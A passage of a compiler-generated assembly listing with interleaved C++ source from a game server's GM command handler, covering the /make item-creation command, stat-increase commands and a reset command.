; 4037 : 			op3 = GetTokenNumberEx();

  03109	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  0310c	e8 00 00 00 00	 call	 ?GetTokenNumberEx@CGMMng@@QAEHXZ ; CGMMng::GetTokenNumberEx
  03111	89 85 94 f3 ff
	ff		 mov	 DWORD PTR _op3$32[ebp], eax

; 4038 : 
; 4039 : 			exoption = GetTokenNumberEx();

  03117	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  0311a	e8 00 00 00 00	 call	 ?GetTokenNumberEx@CGMMng@@QAEHXZ ; CGMMng::GetTokenNumberEx
  0311f	89 85 90 f3 ff
	ff		 mov	 DWORD PTR _exoption$31[ebp], eax

; 4040 : 
; 4041 : #if GAME_VERSION >= G_V_99B
; 4042 : 			int setoption = GetTokenNumber();

  03125	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  03128	e8 00 00 00 00	 call	 ?GetTokenNumber@CGMMng@@QAEHXZ ; CGMMng::GetTokenNumber
  0312d	89 85 84 f3 ff
	ff		 mov	 DWORD PTR _setoption$28[ebp], eax

; 4043 : #else
; 4044 : 			int setoption = 0;
; 4045 : #endif
; 4046 : 
; 4047 : 			/*if(type < 0 || index < 0 || level < 0 || skill < 0 || luck < 0 || op3 < 0 || exoption < 0 || setoption < 0)
; 4048 : 			{
; 4049 : 				goto MakeCommandUsage;
; 4050 : 			}*/
; 4051 : 
; 4052 : 			if(type < 0 || type > MAX_ITEM_TYPE || index < 0 || index > MAX_ITEM_INDEX)

  03133	83 bd a8 f3 ff
	ff 00		 cmp	 DWORD PTR _type$37[ebp], 0
  0313a	7c 1b		 jl	 SHORT $LN264@Management
  0313c	83 bd a8 f3 ff
	ff 10		 cmp	 DWORD PTR _type$37[ebp], 16 ; 00000010H
  03143	7f 12		 jg	 SHORT $LN264@Management
  03145	83 bd a4 f3 ff
	ff 00		 cmp	 DWORD PTR _index$36[ebp], 0
  0314c	7c 09		 jl	 SHORT $LN264@Management
  0314e	83 bd a4 f3 ff
	ff 20		 cmp	 DWORD PTR _index$36[ebp], 32 ; 00000020H
  03155	7e 05		 jle	 SHORT $LN263@Management
$LN264@Management:

; 4053 : 				break;

  03157	e9 60 0b 00 00	 jmp	 $LN2@Management
$LN263@Management:

; 4054 : 
; 4055 : 			int itemtype = ItemGetNumberMake( type, index);

  0315c	8b 85 a4 f3 ff
	ff		 mov	 eax, DWORD PTR _index$36[ebp]
  03162	50		 push	 eax
  03163	8b 8d a8 f3 ff
	ff		 mov	 ecx, DWORD PTR _type$37[ebp]
  03169	51		 push	 ecx
  0316a	e8 00 00 00 00	 call	 ?ItemGetNumberMake@@YAHHH@Z ; ItemGetNumberMake
  0316f	83 c4 08	 add	 esp, 8
  03172	89 85 80 f3 ff
	ff		 mov	 DWORD PTR _itemtype$27[ebp], eax

; 4056 : 
; 4057 : 			if(IsItem(itemtype) == FALSE)

  03178	8b 85 80 f3 ff
	ff		 mov	 eax, DWORD PTR _itemtype$27[ebp]
  0317e	50		 push	 eax
  0317f	e8 00 00 00 00	 call	 ?IsItem@@YAHH@Z		; IsItem
  03184	83 c4 04	 add	 esp, 4
  03187	85 c0		 test	 eax, eax
  03189	75 05		 jne	 SHORT $LN265@Management

; 4058 : 			{
; 4059 : 				break;

  0318b	e9 2c 0b 00 00	 jmp	 $LN2@Management
$LN265@Management:

; 4060 : 			}
; 4061 : 
; 4062 : 			exoption %= 7;

  03190	8b 85 90 f3 ff
	ff		 mov	 eax, DWORD PTR _exoption$31[ebp]
  03196	99		 cdq
  03197	b9 07 00 00 00	 mov	 ecx, 7
  0319c	f7 f9		 idiv	 ecx
  0319e	89 95 90 f3 ff
	ff		 mov	 DWORD PTR _exoption$31[ebp], edx

; 4063 : 			setoption %= 2;

  031a4	8b 85 84 f3 ff
	ff		 mov	 eax, DWORD PTR _setoption$28[ebp]
  031aa	25 01 00 00 80	 and	 eax, -2147483647	; 80000001H
  031af	79 05		 jns	 SHORT $LN332@Management
  031b1	48		 dec	 eax
  031b2	83 c8 fe	 or	 eax, -2			; fffffffeH
  031b5	40		 inc	 eax
$LN332@Management:
  031b6	89 85 84 f3 ff
	ff		 mov	 DWORD PTR _setoption$28[ebp], eax

; 4064 : 
; 4065 : #ifdef ITEM_12_13_20040401
; 4066 : 			if(level < 0 || level > 13)

  031bc	83 bd a0 f3 ff
	ff 00		 cmp	 DWORD PTR _level$35[ebp], 0
  031c3	7c 09		 jl	 SHORT $LN267@Management
  031c5	83 bd a0 f3 ff
	ff 0d		 cmp	 DWORD PTR _level$35[ebp], 13 ; 0000000dH
  031cc	7e 2b		 jle	 SHORT $LN266@Management
$LN267@Management:

; 4067 : 			{
; 4068 : 				level = (level < 0 ? 0 : 13);

  031ce	83 bd a0 f3 ff
	ff 00		 cmp	 DWORD PTR _level$35[ebp], 0
  031d5	7d 0c		 jge	 SHORT $LN322@Management
  031d7	c7 85 84 e5 ff
	ff 00 00 00 00	 mov	 DWORD PTR tv2136[ebp], 0
  031e1	eb 0a		 jmp	 SHORT $LN323@Management
$LN322@Management:
  031e3	c7 85 84 e5 ff
	ff 0d 00 00 00	 mov	 DWORD PTR tv2136[ebp], 13 ; 0000000dH
$LN323@Management:
  031ed	8b 85 84 e5 ff
	ff		 mov	 eax, DWORD PTR tv2136[ebp]
  031f3	89 85 a0 f3 ff
	ff		 mov	 DWORD PTR _level$35[ebp], eax
$LN266@Management:

; 4069 : 			}
; 4070 : #else
; 4071 : 			if(itemtype == MAKE_ITEMNUM(14, 11))
; 4072 : 			{
; 4073 : 				if(level < 0 || level > 12)
; 4074 : 					level = (level < 0 ? 0 : 12);
; 4075 : 			}
; 4076 : 			else if(level < 0 || level > 11)
; 4077 : 			{
; 4078 : 				level = (level < 0 ? 0 : 11);
; 4079 : 			}
; 4080 : #endif
; 4081 : 
; 4082 : #if GAME_VERSION >= G_V_99B
; 4083 : 			/*if(setoption == -1)
; 4084 : 			{
; 4085 : 				goto MakeCommandUsage;
; 4086 : 			}*/
; 4087 : 
; 4088 : 			setoption %= 2;

  031f9	8b 85 84 f3 ff
	ff		 mov	 eax, DWORD PTR _setoption$28[ebp]
  031ff	25 01 00 00 80	 and	 eax, -2147483647	; 80000001H
  03204	79 05		 jns	 SHORT $LN333@Management
  03206	48		 dec	 eax
  03207	83 c8 fe	 or	 eax, -2			; fffffffeH
  0320a	40		 inc	 eax
$LN333@Management:
  0320b	89 85 84 f3 ff
	ff		 mov	 DWORD PTR _setoption$28[ebp], eax

; 4089 : 
; 4090 : 			if(setoption == 0 || gSetItemOption.IsSetItem(itemtype) == FALSE)

  03211	83 bd 84 f3 ff
	ff 00		 cmp	 DWORD PTR _setoption$28[ebp], 0
  03218	74 15		 je	 SHORT $LN270@Management
  0321a	8b 85 80 f3 ff
	ff		 mov	 eax, DWORD PTR _itemtype$27[ebp]
  03220	50		 push	 eax
  03221	b9 00 00 00 00	 mov	 ecx, OFFSET ?gSetItemOption@@3VCSetItemOption@@A ; gSetItemOption
  03226	e8 00 00 00 00	 call	 ?IsSetItem@CSetItemOption@@QAEHH@Z ; CSetItemOption::IsSetItem
  0322b	85 c0		 test	 eax, eax
  0322d	75 0c		 jne	 SHORT $LN268@Management
$LN270@Management:

; 4091 : 			{
; 4092 : 				setoption = 0;

  0322f	c7 85 84 f3 ff
	ff 00 00 00 00	 mov	 DWORD PTR _setoption$28[ebp], 0

; 4093 : 			}

  03239	eb 17		 jmp	 SHORT $LN269@Management
$LN268@Management:

; 4094 : 			else
; 4095 : 			{
; 4096 : 				setoption = gSetItemOption.GenSetOption(itemtype);

  0323b	8b 85 80 f3 ff
	ff		 mov	 eax, DWORD PTR _itemtype$27[ebp]
  03241	50		 push	 eax
  03242	b9 00 00 00 00	 mov	 ecx, OFFSET ?gSetItemOption@@3VCSetItemOption@@A ; gSetItemOption
  03247	e8 00 00 00 00	 call	 ?GenSetOption@CSetItemOption@@QAEHH@Z ; CSetItemOption::GenSetOption
  0324c	89 85 84 f3 ff
	ff		 mov	 DWORD PTR _setoption$28[ebp], eax
$LN269@Management:

; 4097 : 			}
; 4098 : #endif
; 4099 : 
; 4100 : #if GAME_VERSION >= G_V_99B
; 4101 : 			dur = ItemGetDurability(itemtype,level,NewOption,setoption);

  03252	8b 85 84 f3 ff
	ff		 mov	 eax, DWORD PTR _setoption$28[ebp]
  03258	50		 push	 eax
  03259	0f b6 8d 8f f3
	ff ff		 movzx	 ecx, BYTE PTR _NewOption$30[ebp]
  03260	51		 push	 ecx
  03261	8b 95 a0 f3 ff
	ff		 mov	 edx, DWORD PTR _level$35[ebp]
  03267	52		 push	 edx
  03268	8b 85 80 f3 ff
	ff		 mov	 eax, DWORD PTR _itemtype$27[ebp]
  0326e	50		 push	 eax
  0326f	e8 00 00 00 00	 call	 ?ItemGetDurability@@YAHHHHH@Z ; ItemGetDurability
  03274	83 c4 10	 add	 esp, 16			; 00000010H
  03277	89 85 88 f3 ff
	ff		 mov	 DWORD PTR _dur$29[ebp], eax

; 4102 : #else
; 4103 : 			dur = ItemGetDurability(itemtype,level,NewOption,0);
; 4104 : #endif	
; 4105 : 
; 4106 : 			if(exoption != 0 && setoption == 0)

  0327d	83 bd 90 f3 ff
	ff 00		 cmp	 DWORD PTR _exoption$31[ebp], 0
  03284	74 5c		 je	 SHORT $LN53@Management
  03286	83 bd 84 f3 ff
	ff 00		 cmp	 DWORD PTR _setoption$28[ebp], 0
  0328d	75 53		 jne	 SHORT $LN53@Management

; 4107 : 			{
; 4108 : 				int iCount = exoption;

  0328f	8b 85 90 f3 ff
	ff		 mov	 eax, DWORD PTR _exoption$31[ebp]
  03295	89 85 7c f3 ff
	ff		 mov	 DWORD PTR _iCount$26[ebp], eax

; 4109 : 
; 4110 : 				for(int i = 0;i < iCount;i++)

  0329b	c7 85 78 f3 ff
	ff 00 00 00 00	 mov	 DWORD PTR _i$25[ebp], 0
  032a5	eb 0f		 jmp	 SHORT $LN54@Management
$LN52@Management:
  032a7	8b 85 78 f3 ff
	ff		 mov	 eax, DWORD PTR _i$25[ebp]
  032ad	83 c0 01	 add	 eax, 1
  032b0	89 85 78 f3 ff
	ff		 mov	 DWORD PTR _i$25[ebp], eax
$LN54@Management:
  032b6	8b 85 78 f3 ff
	ff		 mov	 eax, DWORD PTR _i$25[ebp]
  032bc	3b 85 7c f3 ff
	ff		 cmp	 eax, DWORD PTR _iCount$26[ebp]
  032c2	7d 1e		 jge	 SHORT $LN53@Management

; 4111 : 					NewOption |= 1 << i;

  032c4	b8 01 00 00 00	 mov	 eax, 1
  032c9	8b 8d 78 f3 ff
	ff		 mov	 ecx, DWORD PTR _i$25[ebp]
  032cf	d3 e0		 shl	 eax, cl
  032d1	0f b6 8d 8f f3
	ff ff		 movzx	 ecx, BYTE PTR _NewOption$30[ebp]
  032d8	0b c8		 or	 ecx, eax
  032da	88 8d 8f f3 ff
	ff		 mov	 BYTE PTR _NewOption$30[ebp], cl
  032e0	eb c5		 jmp	 SHORT $LN52@Management
$LN53@Management:

; 4112 : 			}
; 4113 : 
; 4114 : 			if( (type >= 0 && type < MAX_ITEM_INDEX) &&

  032e2	83 bd a8 f3 ff
	ff 00		 cmp	 DWORD PTR _type$37[ebp], 0
  032e9	0f 8c b5 01 00
	00		 jl	 $LN276@Management
  032ef	83 bd a8 f3 ff
	ff 20		 cmp	 DWORD PTR _type$37[ebp], 32 ; 00000020H
  032f6	0f 8d a8 01 00
	00		 jge	 $LN276@Management
  032fc	83 bd a4 f3 ff
	ff 00		 cmp	 DWORD PTR _index$36[ebp], 0
  03303	0f 8c 9b 01 00
	00		 jl	 $LN276@Management
  03309	83 bd a4 f3 ff
	ff 20		 cmp	 DWORD PTR _index$36[ebp], 32 ; 00000020H
  03310	0f 8d 8e 01 00
	00		 jge	 $LN276@Management

; 4115 : 				(index>= 0 && index< MAX_ITEM_INDEX) )
; 4116 : 			{
; 4117 : #ifdef CS_MAKE_ITEM_POTION		//   - // , ,      .
; 4118 : 				if( itemtype != MAKE_ITEMNUM(14, 7) &&
; 4119 : 					itemtype != MAKE_ITEMNUM(13, 7) && 
; 4120 : 					itemtype != MAKE_ITEMNUM(13, 11) 
; 4121 : 					)
; 4122 : 				{
; 4123 : 					break;
; 4124 : 				}
; 4125 : #endif
; 4126 : 
; 4127 : 				if( itemtype == MAKE_ITEMNUM(0, 19) || 
; 4128 : 					itemtype == MAKE_ITEMNUM(4, 18) || 

  03316	6a 13		 push	 19			; 00000013H
  03318	6a 00		 push	 0
  0331a	e8 00 00 00 00	 call	 ?MakeItemNumber@@YAHHH@Z ; MakeItemNumber
  0331f	83 c4 08	 add	 esp, 8
  03322	39 85 80 f3 ff
	ff		 cmp	 DWORD PTR _itemtype$27[ebp], eax
  03328	74 28		 je	 SHORT $LN274@Management
  0332a	6a 12		 push	 18			; 00000012H
  0332c	6a 04		 push	 4
  0332e	e8 00 00 00 00	 call	 ?MakeItemNumber@@YAHHH@Z ; MakeItemNumber
  03333	83 c4 08	 add	 esp, 8
  03336	39 85 80 f3 ff
	ff		 cmp	 DWORD PTR _itemtype$27[ebp], eax
  0333c	74 14		 je	 SHORT $LN274@Management
  0333e	6a 0a		 push	 10			; 0000000aH
  03340	6a 05		 push	 5
  03342	e8 00 00 00 00	 call	 ?MakeItemNumber@@YAHHH@Z ; MakeItemNumber
  03347	83 c4 08	 add	 esp, 8
  0334a	39 85 80 f3 ff
	ff		 cmp	 DWORD PTR _itemtype$27[ebp], eax
  03350	75 07		 jne	 SHORT $LN273@Management
$LN274@Management:

; 4129 : 					itemtype == MAKE_ITEMNUM(5, 10) 
; 4130 : #ifdef ADD_WEAPON_OF_ARCHANGEL_SCEPTER_20050706
; 4131 : 					|| itemtype == MAKE_ITEMNUM(2, 13)			
; 4132 : #endif
; 4133 : 			  )
; 4134 : 				{	//       
; 4135 : 					NewOption = 0x3f;

  03352	c6 85 8f f3 ff
	ff 3f		 mov	 BYTE PTR _NewOption$30[ebp], 63 ; 0000003fH
$LN273@Management:

; 4136 : 				}
; 4137 : 
; 4138 : #ifdef DARKLORD_WORK
; 4139 : 				if( itemtype == MAKE_ITEMNUM(13, 4) || itemtype == MAKE_ITEMNUM(13, 5) )

  03359	6a 04		 push	 4
  0335b	6a 0d		 push	 13			; 0000000dH
  0335d	e8 00 00 00 00	 call	 ?MakeItemNumber@@YAHHH@Z ; MakeItemNumber
  03362	83 c4 08	 add	 esp, 8
  03365	39 85 80 f3 ff
	ff		 cmp	 DWORD PTR _itemtype$27[ebp], eax
  0336b	74 18		 je	 SHORT $LN277@Management
  0336d	6a 05		 push	 5
  0336f	6a 0d		 push	 13			; 0000000dH
  03371	e8 00 00 00 00	 call	 ?MakeItemNumber@@YAHHH@Z ; MakeItemNumber
  03376	83 c4 08	 add	 esp, 8
  03379	39 85 80 f3 ff
	ff		 cmp	 DWORD PTR _itemtype$27[ebp], eax
  0337f	0f 85 91 00 00
	00		 jne	 $LN275@Management
$LN277@Management:

; 4140 : 				{
; 4141 : 					PetItemSerialCreateSend(aIndex, gObj[aIndex].MapNumber, gObj[aIndex].X, gObj[aIndex].Y, itemtype, level, (BYTE)dur, skill, luck, op3, -1, NewOption, setoption);

  03385	0f b6 85 84 f3
	ff ff		 movzx	 eax, BYTE PTR _setoption$28[ebp]
  0338c	50		 push	 eax
  0338d	0f b6 8d 8f f3
	ff ff		 movzx	 ecx, BYTE PTR _NewOption$30[ebp]
  03394	51		 push	 ecx
  03395	6a ff		 push	 -1
  03397	0f b6 95 94 f3
	ff ff		 movzx	 edx, BYTE PTR _op3$32[ebp]
  0339e	52		 push	 edx
  0339f	0f b6 85 98 f3
	ff ff		 movzx	 eax, BYTE PTR _luck$33[ebp]
  033a6	50		 push	 eax
  033a7	0f b6 8d 9c f3
	ff ff		 movzx	 ecx, BYTE PTR _skill$34[ebp]
  033ae	51		 push	 ecx
  033af	0f b6 95 88 f3
	ff ff		 movzx	 edx, BYTE PTR _dur$29[ebp]
  033b6	52		 push	 edx
  033b7	0f b6 85 a0 f3
	ff ff		 movzx	 eax, BYTE PTR _level$35[ebp]
  033be	50		 push	 eax
  033bf	8b 8d 80 f3 ff
	ff		 mov	 ecx, DWORD PTR _itemtype$27[ebp]
  033c5	51		 push	 ecx
  033c6	69 55 10 a0 1b
	00 00		 imul	 edx, DWORD PTR _aIndex$[ebp], 7072
  033cd	a1 00 00 00 00	 mov	 eax, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  033d2	0f b6 8c 10 06
	01 00 00	 movzx	 ecx, BYTE PTR [eax+edx+262]
  033da	51		 push	 ecx
  033db	69 55 10 a0 1b
	00 00		 imul	 edx, DWORD PTR _aIndex$[ebp], 7072
  033e2	a1 00 00 00 00	 mov	 eax, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  033e7	0f b6 8c 10 04
	01 00 00	 movzx	 ecx, BYTE PTR [eax+edx+260]
  033ef	51		 push	 ecx
  033f0	69 55 10 a0 1b
	00 00		 imul	 edx, DWORD PTR _aIndex$[ebp], 7072
  033f7	a1 00 00 00 00	 mov	 eax, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  033fc	0f b6 8c 10 09
	01 00 00	 movzx	 ecx, BYTE PTR [eax+edx+265]
  03404	51		 push	 ecx
  03405	8b 55 10	 mov	 edx, DWORD PTR _aIndex$[ebp]
  03408	52		 push	 edx
  03409	e8 00 00 00 00	 call	 ?PetItemSerialCreateSend@@YAXHEEEHEEEEEHEE@Z ; PetItemSerialCreateSend
  0340e	83 c4 34	 add	 esp, 52			; 00000034H

; 4142 : 				}

  03411	e9 8e 00 00 00	 jmp	 $LN276@Management
$LN275@Management:

; 4143 : 				else
; 4144 : #endif	// #ifdef DARKLORD_WORK
; 4145 : 
; 4146 : 					ItemSerialCreateSend(aIndex, gObj[aIndex].MapNumber, gObj[aIndex].X, gObj[aIndex].Y, itemtype, level, (BYTE)dur, skill, luck, op3, -1, NewOption, setoption);

  03416	6a 00		 push	 0
  03418	0f b6 85 84 f3
	ff ff		 movzx	 eax, BYTE PTR _setoption$28[ebp]
  0341f	50		 push	 eax
  03420	0f b6 8d 8f f3
	ff ff		 movzx	 ecx, BYTE PTR _NewOption$30[ebp]
  03427	51		 push	 ecx
  03428	6a ff		 push	 -1
  0342a	0f b6 95 94 f3
	ff ff		 movzx	 edx, BYTE PTR _op3$32[ebp]
  03431	52		 push	 edx
  03432	0f b6 85 98 f3
	ff ff		 movzx	 eax, BYTE PTR _luck$33[ebp]
  03439	50		 push	 eax
  0343a	0f b6 8d 9c f3
	ff ff		 movzx	 ecx, BYTE PTR _skill$34[ebp]
  03441	51		 push	 ecx
  03442	0f b6 95 88 f3
	ff ff		 movzx	 edx, BYTE PTR _dur$29[ebp]
  03449	52		 push	 edx
  0344a	0f b6 85 a0 f3
	ff ff		 movzx	 eax, BYTE PTR _level$35[ebp]
  03451	50		 push	 eax
  03452	8b 8d 80 f3 ff
	ff		 mov	 ecx, DWORD PTR _itemtype$27[ebp]
  03458	51		 push	 ecx
  03459	69 55 10 a0 1b
	00 00		 imul	 edx, DWORD PTR _aIndex$[ebp], 7072
  03460	a1 00 00 00 00	 mov	 eax, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  03465	0f b6 8c 10 06
	01 00 00	 movzx	 ecx, BYTE PTR [eax+edx+262]
  0346d	51		 push	 ecx
  0346e	69 55 10 a0 1b
	00 00		 imul	 edx, DWORD PTR _aIndex$[ebp], 7072
  03475	a1 00 00 00 00	 mov	 eax, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  0347a	0f b6 8c 10 04
	01 00 00	 movzx	 ecx, BYTE PTR [eax+edx+260]
  03482	51		 push	 ecx
  03483	69 55 10 a0 1b
	00 00		 imul	 edx, DWORD PTR _aIndex$[ebp], 7072
  0348a	a1 00 00 00 00	 mov	 eax, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  0348f	0f b6 8c 10 09
	01 00 00	 movzx	 ecx, BYTE PTR [eax+edx+265]
  03497	51		 push	 ecx
  03498	8b 55 10	 mov	 edx, DWORD PTR _aIndex$[ebp]
  0349b	52		 push	 edx
  0349c	e8 00 00 00 00	 call	 ?ItemSerialCreateSend@@YAXHEEEHEEEEEHEEH@Z ; ItemSerialCreateSend
  034a1	83 c4 38	 add	 esp, 56			; 00000038H
$LN276@Management:

; 4147 : 
; 4148 : 			}
; 4149 : 			break;

  034a4	e9 13 08 00 00	 jmp	 $LN2@Management
$MakeCommandUsage$334:

; 4150 : MakeCommandUsage:
; 4151 : 			{
; 4152 : 				PMSG_NOTICE msgNotice;
; 4153 : 
; 4154 : #if GAME_VERSION >= G_V_99B
; 4155 : 				TNotice::MakeNoticeMsgEx((LPVOID)&msgNotice, 0, "Command Make Usage: /make Type Index Level IsSkill IsLuck Option ExcOption SetOption");

  034a9	68 00 00 00 00	 push	 OFFSET ??_C@_0FF@DOGCJMIO@Command?5Make?5Usage?3?5?1make?5Type?5@
  034ae	6a 00		 push	 0
  034b0	8d 85 68 f2 ff
	ff		 lea	 eax, DWORD PTR _msgNotice$24[ebp]
  034b6	50		 push	 eax
  034b7	e8 00 00 00 00	 call	 ?MakeNoticeMsgEx@TNotice@@SAXPAXEPADZZ ; TNotice::MakeNoticeMsgEx
  034bc	83 c4 0c	 add	 esp, 12			; 0000000cH

; 4156 : #else
; 4157 : 				TNotice::MakeNoticeMsgEx((LPVOID)&msgNotice, 0, "Command Make Usage: /make Type Index Level IsSkill IsLuck Option ExcOption");
; 4158 : #endif
; 4159 : 
; 4160 : 				TNotice::SendNoticeToUser(lpObj->m_Index, (LPVOID)&msgNotice);

  034bf	8d 85 68 f2 ff
	ff		 lea	 eax, DWORD PTR _msgNotice$24[ebp]
  034c5	50		 push	 eax
  034c6	8b 4d 08	 mov	 ecx, DWORD PTR _lpObj$[ebp]
  034c9	8b 11		 mov	 edx, DWORD PTR [ecx]
  034cb	52		 push	 edx
  034cc	e8 00 00 00 00	 call	 ?SendNoticeToUser@TNotice@@SAXHPAX@Z ; TNotice::SendNoticeToUser
  034d1	83 c4 08	 add	 esp, 8

; 4161 : 			}
; 4162 : 		}
; 4163 : 		break;

  034d4	e9 e3 07 00 00	 jmp	 $LN2@Management
$LN278@Management:

; 4164 : 
; 4165 : 	case GMCMD_ADDSTR:
; 4166 : 		{	
; 4167 : 			int _strength = GetTokenNumber();

  034d9	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  034dc	e8 00 00 00 00	 call	 ?GetTokenNumber@CGMMng@@QAEHXZ ; CGMMng::GetTokenNumber
  034e1	89 85 64 f2 ff
	ff		 mov	 DWORD PTR __strength$23[ebp], eax

; 4168 : 
; 4169 : 			IncreaseStat(lpObj, _strength, IS_STRENGTH);		

  034e7	6a 00		 push	 0
  034e9	8b 85 64 f2 ff
	ff		 mov	 eax, DWORD PTR __strength$23[ebp]
  034ef	50		 push	 eax
  034f0	8b 4d 08	 mov	 ecx, DWORD PTR _lpObj$[ebp]
  034f3	51		 push	 ecx
  034f4	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  034f7	e8 00 00 00 00	 call	 ?IncreaseStat@CGMMng@@AAEXPAVOBJECTSTRUCT@@HW4INCREASE_STAT_ENUM@@@Z ; CGMMng::IncreaseStat

; 4170 : 		}
; 4171 : 		break;

  034fc	e9 bb 07 00 00	 jmp	 $LN2@Management
$LN279@Management:

; 4172 : 
; 4173 : 	case GMCMD_ADDDEX:
; 4174 : 		{	
; 4175 : 			int _dexterity = GetTokenNumber();

  03501	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  03504	e8 00 00 00 00	 call	 ?GetTokenNumber@CGMMng@@QAEHXZ ; CGMMng::GetTokenNumber
  03509	89 85 60 f2 ff
	ff		 mov	 DWORD PTR __dexterity$22[ebp], eax

; 4176 : 
; 4177 : 			IncreaseStat(lpObj, _dexterity, IS_DEXTERITY);		

  0350f	6a 01		 push	 1
  03511	8b 85 60 f2 ff
	ff		 mov	 eax, DWORD PTR __dexterity$22[ebp]
  03517	50		 push	 eax
  03518	8b 4d 08	 mov	 ecx, DWORD PTR _lpObj$[ebp]
  0351b	51		 push	 ecx
  0351c	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  0351f	e8 00 00 00 00	 call	 ?IncreaseStat@CGMMng@@AAEXPAVOBJECTSTRUCT@@HW4INCREASE_STAT_ENUM@@@Z ; CGMMng::IncreaseStat

; 4178 : 		}
; 4179 : 		break;

  03524	e9 93 07 00 00	 jmp	 $LN2@Management
$LN280@Management:

; 4180 : 
; 4181 : 	case GMCMD_ADDVIT:
; 4182 : 		{	
; 4183 : 			int _vitality = GetTokenNumber();

  03529	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  0352c	e8 00 00 00 00	 call	 ?GetTokenNumber@CGMMng@@QAEHXZ ; CGMMng::GetTokenNumber
  03531	89 85 5c f2 ff
	ff		 mov	 DWORD PTR __vitality$21[ebp], eax

; 4184 : 
; 4185 : 			IncreaseStat(lpObj, _vitality, IS_VITALITY);		

  03537	6a 02		 push	 2
  03539	8b 85 5c f2 ff
	ff		 mov	 eax, DWORD PTR __vitality$21[ebp]
  0353f	50		 push	 eax
  03540	8b 4d 08	 mov	 ecx, DWORD PTR _lpObj$[ebp]
  03543	51		 push	 ecx
  03544	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  03547	e8 00 00 00 00	 call	 ?IncreaseStat@CGMMng@@AAEXPAVOBJECTSTRUCT@@HW4INCREASE_STAT_ENUM@@@Z ; CGMMng::IncreaseStat

; 4186 : 		}
; 4187 : 		break;

  0354c	e9 6b 07 00 00	 jmp	 $LN2@Management
$LN281@Management:

; 4188 : 
; 4189 : 	case GMCMD_ADDENE:
; 4190 : 		{	
; 4191 : 			int _energy = GetTokenNumber();

  03551	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  03554	e8 00 00 00 00	 call	 ?GetTokenNumber@CGMMng@@QAEHXZ ; CGMMng::GetTokenNumber
  03559	89 85 58 f2 ff
	ff		 mov	 DWORD PTR __energy$20[ebp], eax

; 4192 : 
; 4193 : 			IncreaseStat(lpObj, _energy, IS_ENERGY);		

  0355f	6a 03		 push	 3
  03561	8b 85 58 f2 ff
	ff		 mov	 eax, DWORD PTR __energy$20[ebp]
  03567	50		 push	 eax
  03568	8b 4d 08	 mov	 ecx, DWORD PTR _lpObj$[ebp]
  0356b	51		 push	 ecx
  0356c	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  0356f	e8 00 00 00 00	 call	 ?IncreaseStat@CGMMng@@AAEXPAVOBJECTSTRUCT@@HW4INCREASE_STAT_ENUM@@@Z ; CGMMng::IncreaseStat

; 4194 : 		}
; 4195 : 		break;

  03574	e9 43 07 00 00	 jmp	 $LN2@Management
$LN282@Management:

; 4196 : 
; 4197 : #ifdef DARKLORD_WORK
; 4198 : 	case GMCMD_ADDCOM:
; 4199 : 		{	
; 4200 : 			int _command = GetTokenNumber();

  03579	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  0357c	e8 00 00 00 00	 call	 ?GetTokenNumber@CGMMng@@QAEHXZ ; CGMMng::GetTokenNumber
  03581	89 85 54 f2 ff
	ff		 mov	 DWORD PTR __command$19[ebp], eax

; 4201 : 
; 4202 : 			IncreaseStat(lpObj, _command, IS_COMMAND);		

  03587	6a 04		 push	 4
  03589	8b 85 54 f2 ff
	ff		 mov	 eax, DWORD PTR __command$19[ebp]
  0358f	50		 push	 eax
  03590	8b 4d 08	 mov	 ecx, DWORD PTR _lpObj$[ebp]
  03593	51		 push	 ecx
  03594	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  03597	e8 00 00 00 00	 call	 ?IncreaseStat@CGMMng@@AAEXPAVOBJECTSTRUCT@@HW4INCREASE_STAT_ENUM@@@Z ; CGMMng::IncreaseStat

; 4203 : 		}
; 4204 : 		break;

  0359c	e9 1b 07 00 00	 jmp	 $LN2@Management
$LN283@Management:

; 4205 : #endif
; 4206 : 
; 4207 : 	case GMCMD_RESETCOMMAND:
; 4208 : 		{
; 4209 : 			if(g_ResetSystem.GetResetCmdAuthority() == 0)

  035a1	b9 00 00 00 00	 mov	 ecx, OFFSET ?g_ResetSystem@@3VCResetSystem@@A ; g_ResetSystem
  035a6	e8 00 00 00 00	 call	 ?GetResetCmdAuthority@CResetSystem@@QAEHXZ ; CResetSystem::GetResetCmdAuthority
  035ab	85 c0		 test	 eax, eax
  035ad	75 07		 jne	 SHORT $LN284@Management

; 4210 : 			{
; 4211 : 				return 0;

  035af	33 c0		 xor	 eax, eax
  035b1	e9 08 07 00 00	 jmp	 $LN1@Management
$LN284@Management:

; 4212 : 			}
; 4213 : 
; 4214 : 			g_ResetSystem.CheckUserCondition(lpObj);

  035b6	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  035b9	50		 push	 eax
  035ba	b9 00 00 00 00	 mov	 ecx, OFFSET ?g_ResetSystem@@3VCResetSystem@@A ; g_ResetSystem
  035bf	e8 00 00 00 00	 call	 ?CheckUserCondition@CResetSystem@@QAEXPAVOBJECTSTRUCT@@@Z ; CResetSystem::CheckUserCondition

; 4215 : 		}
; 4216 : 		break;

  035c4	e9 f3 06 00 00	 jmp	 $LN2@Management
$LN285@Management:

; 4217 : 
; 4218 : 	/*case GMCMD_VIPINFO:
; 4219 : 		{
; 4220 : 			if(g_VIPSystem.m_bShowInfo)
; 4221 : 			{
; 4222 : 				MsgOutput(aIndex,"VIP Level: %d",lpObj->m_AccountType);
